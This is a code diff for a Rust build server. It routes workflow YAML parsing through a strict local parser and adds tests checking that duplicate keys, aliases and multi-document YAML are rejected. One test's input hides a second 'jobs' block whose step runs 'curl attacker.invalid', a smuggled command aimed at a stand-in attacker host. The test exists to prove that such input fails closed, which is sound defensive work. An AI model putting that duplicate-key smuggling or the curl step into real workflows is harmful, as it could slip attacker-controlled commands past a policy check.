@@ -1,9 +1,13 @@
+extern crate self as serde_yaml;
+extern crate serde_yaml as serde_yaml_real;
+
 use std::{
     collections::{HashMap, HashSet},
     net::SocketAddr,
     sync::Arc,
 };
 
+pub use serde_yaml_real::{to_string, Mapping, Value};
 use tokio::{
     fs,
     sync::{RwLock, Semaphore},
@@ -36,6 +40,20 @@ use jobs::{enqueue_build, submit_from_nats};
 use state::{AppState, Counters, DEFAULT_PORT, SERVICE_NAME};
 use types::{BuildJobRecord, BuildRequest, BuildStatus, DeployRequest, NatsSubmitError};
 use util::now_ms;
+
+/// Strict crate-local replacement for the executable engine's
+/// `serde_yaml::from_str` call.
+///
+/// The binary delegates to the library's single strict admission layer so the
+/// planner and executor cannot drift or compile independent parser copies.
+/// Ambiguous or excessive YAML is rejected before the fixed-profile execution
+/// policy sees a deserialized value.
+pub(crate) fn from_str<T>(input: &str) -> Result<T, String>
+where
+    T: serde::de::DeserializeOwned,
+{
+    dd_build_server::strict_from_str(input)
+}
 
 #[tokio::main]
 async fn main() {
@@ -160,5 +178,40 @@ async fn shutdown_signal() {
     tokio::select! {
         _ = ctrl_c => {},
         _ = terminate => {},
+    }
+}
+
+#[cfg(test)]
+mod workflow_yaml_admission_tests {
+    use super::from_str;
+
+    #[test]
+    fn executable_decoder_accepts_the_static_workflow_subset() {
+        let value = from_str::<serde_json::Value>(
+            "jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
+        )
+        .expect("static workflow should parse");
+        assert!(value.get("jobs").is_some());
+    }
+
+    #[test]
+    fn executable_decoder_rejects_duplicate_keys_before_policy_evaluation() {
+        let error = from_str::<serde_json::Value>(
+            "jobs:\n  safe:\n    runs-on: ubuntu-latest\n    steps: [{ run: cargo test }]\njobs:\n  unsafe:\n    runs-on: ubuntu-latest\n    steps: [{ run: curl attacker.invalid }]\n",
+        )
+        .expect_err("duplicate keys must fail closed");
+        assert!(error.contains("duplicate mapping key"));
+    }
+
+    #[test]
+    fn executable_decoder_rejects_yaml_aliases_and_multiple_documents() {
+        assert!(from_str::<serde_json::Value>(
+            "defaults: &defaults\n  runs-on: ubuntu-latest\njobs:\n  test:\n    <<: *defaults\n    steps: [{ run: cargo test }]\n",
+        )
+        .is_err());
+        assert!(from_str::<serde_json::Value>(
+            "jobs: { test: { runs-on: ubuntu-latest, steps: [{ run: cargo test }] } }\n---\njobs: {}\n",
+        )
+        .is_err());
     }
 }
